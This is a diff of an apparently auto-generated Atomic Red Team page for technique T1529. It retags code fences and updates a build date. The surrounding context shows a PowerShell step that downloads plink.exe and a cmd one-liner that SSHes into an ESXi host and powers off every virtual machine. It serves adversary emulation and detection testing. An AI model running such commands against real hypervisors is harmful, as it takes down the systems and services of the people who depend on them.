@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1529"
 attack_technique_name: "System Shutdown/Reboot"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "622cc1a0-45e7-428c-aed7-c96dd605fbe6"
@@ -71,13 +71,13 @@ Check if we have plink
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
 ```
@@ -89,7 +89,7 @@ Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -O
 
 ### Command
 
-```commandprompt
+```cmd
 echo "" | "#{plink_file}" -batch "#{vm_host}" -ssh -l #{vm_user} -pw "#{vm_pass}" "for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done"
 ```
 
